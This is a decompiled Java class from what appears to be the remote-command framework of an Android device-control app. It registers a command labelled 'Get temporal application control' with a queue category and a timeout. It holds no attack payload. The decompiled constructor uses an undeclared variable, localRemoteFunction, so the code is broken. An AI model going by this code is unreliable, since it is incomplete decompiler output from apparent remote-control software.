package com.vvt.remotecommand.processor.g;

import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.b;
import com.vvt.remotecontrol.RemoteFunction;

public class a
  extends b
{
  public a(com.vvt.remotecontrol.a parama)
  {
    super(parama, true, localRemoteFunction);
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "Get temporal application control";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 30000L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/FxFileObserverWorker/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */